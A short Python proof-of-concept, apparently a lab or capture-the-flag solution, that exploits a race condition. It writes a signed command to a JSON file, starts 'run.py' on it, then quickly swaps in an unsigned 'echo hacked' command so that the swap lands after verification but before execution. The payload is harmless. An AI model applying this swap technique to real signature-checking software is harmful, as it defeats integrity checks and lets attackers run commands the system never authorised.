import json
import threading
import time
import subprocess

example = {"command": "echo cool", "signature": "6c68e3c88a87339fa8667cb36c82d4cf0bdcc131efcf98eb8df1867122e66e0e2e9d8d1ce01c40261fb8bde61a7768215c20febc2cd522af3a2232be73cabe3ada6d86b1635a52c787bd7d97985f4ce2ef9b47ea0c72bdb35b702f9169218adc2d4cd53eabfc3c875bef05270b703d407afb5b22198d56f3489ec8e3241c19a9"}

def main():

    with open("hacked.json", 'w') as f:
        json.dump(example, f)
    process = subprocess.Popen(["python3", "run.py", "hacked.json"])
    time.sleep(0.1)
    with open("hacked.json", 'w') as f:
        json.dump({"command": "echo hacked"}, f)     
    process.wait()


if __name__ == '__main__':
    import sys
    sys.exit(main())

